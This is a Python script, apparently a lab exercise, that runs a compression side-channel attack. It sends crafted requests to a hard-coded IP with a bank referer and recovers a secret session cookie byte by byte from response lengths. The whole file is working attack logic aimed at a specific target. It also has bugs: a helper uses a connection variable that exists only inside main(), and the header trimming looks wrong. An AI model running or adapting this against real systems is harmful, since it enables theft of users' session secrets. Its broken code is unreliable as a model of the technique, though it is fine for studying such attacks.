import socket
import string

TARGET_HOST = '140.122.185.174'
TARGET_PORT = 8081
BUFFER_SIZE = 1024
CHARACTER_BYTES = 16
SECRET_KEY = ''

def establish_connection():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((TARGET_HOST, TARGET_PORT))
    return connection

def build_headers(secret):
    return (
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) "
        "AppleWebKit/537.1 (KHTML, like Gecko) "
        "Chrome/22.0.1207.1 Safari/537.1\r\n"
        "Accept: */*\r\n"
        "Referer: https://thebankserver.com/\r\n"
        f"Cookie: secret={secret}"
    )

def send_request(socket_connection, headers):
    socket_connection.send(headers.encode("utf-8") + b'\r\n')
    return socket_connection.recv(BUFFER_SIZE)

def find_possible_char(headers, charset):
    char_dict = {}
    for char in charset:
        test_headers = headers + str(char)
        response_data = send_request(connection, test_headers)
        char_dict[char] = len(response_data)
    return char_dict

def get_min_char(char_dict):
    min_val = min(char_dict.values())
    return "".join(char for char, value in char_dict.items() if value == min_val)

def main():
    global SECRET_KEY
    connection = establish_connection()

    for byte_index in range(1, CHARACTER_BYTES + 1):
        headers = build_headers(SECRET_KEY)
        charset = string.digits + string.ascii_letters
       
        while len(charset) != 1:
            possible_char_dict = find_possible_char(headers, charset)
            min_char = get_min_char(possible_char_dict)

            charset = min_char
            headers = headers[1:]

        SECRET_KEY += charset
        print(f'Answer of first {byte_index} bytes: secret={SECRET_KEY}')

    print('\nFinal result: secret=%s' % SECRET_KEY)
    connection.close()

if __name__ == "__main__":
    main()
